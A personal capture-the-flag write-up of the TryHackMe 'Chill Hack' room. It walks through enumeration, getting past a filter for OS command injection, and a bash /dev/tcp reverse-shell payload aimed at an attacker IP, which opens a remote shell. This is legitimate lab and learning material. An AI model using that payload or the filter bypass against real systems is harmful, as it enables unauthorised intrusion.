# Summary
- link: https://tryhackme.com/room/chillhack
- Skills required: enumeration, bypass filtering for OS command injection, reverse shell, Linux privilege escalation, mySQL, data exposure via steganography.
- Tools: nmap, ffuf, cyberchef, ssh, ssh-keygen, steghide, stegseek, zip2john, johng
- Learning: I would rate it a relatively difficult easy room given the multi-layer vulunerabilities and time required. It took me 3 hours.

# Details to get the flag:
- with the given IP a basic port discovery was done by nmap `nmap -sS ip`. When ports were discovered, more switches were used to reveal details.
- <img width="599" height="743" alt="nmap" src="https://github.com/user-attachments/assets/92b1965e-cd2c-4853-9ba6-d317787ad8c2" />
- Found anonymous FTP port 21, http port 80 and SSH port 22.
- FFUF was started to find sub directories. BURP was started record details while I was enumerating manyually.
- Nothing interesting found during manual enumeration. Before going on to the secret folder found by FFUF, these were the information on hands including the note.txt found via FTP.
- <img width="914" height="712" alt="notetxt" src="https://github.com/user-attachments/assets/a8328655-af4c-4ec7-83f4-8b59ae2638bb" />
> ftp Anonymous read only
Linux 4.15, Apache 2.4.41
email: demo@gmail.com : shouldn't be anything interesting... index.html
JQuery 1.11.1: searchsploit possible XXS, msfconsole file upload
note.txt: Anurodh told me that there is some filtering on strings being put in the command -- Apaar
user Anurodh
user Apaar

- in the /secret site, it was possible to input linux command and display output on the screen.
- <img width="1346" height="412" alt="Screenshot from 2025-10-12 20-45-44" src="https://github.com/user-attachments/assets/66ebff3b-e7f9-4078-a59e-50104fe5473e" />
- Efford was make trying to check any client side filtering - negative. So it would be server side filtering. Here were the commands I trided.
  - works: whoami, groups, id, /bin/ls
  - doesn't work: ls, cat, /bin/cat index.php - not sure why it didn't work.
- it would be good to have a reverse shell here by having `/bin/bash` instead of `bash`
- This was the payload and it worked: `/bin/bash -c 'bash -i >& /dev/tcp/10.14.106.24/4444 0>&1'`
- It wasn't difficult to find the first foothold and I thought it would be another straight forwarding CTF.
- Enumeration was done again. There was an interesting file revealed a root username password for dbname webportal. I knew it wouldn't be quick...
- <img width="1161" height="574" alt="indexphp root password" src="https://github.com/user-attachments/assets/cae43b9b-e7ff-4ce0-85ef-fb17fb33ce47" />
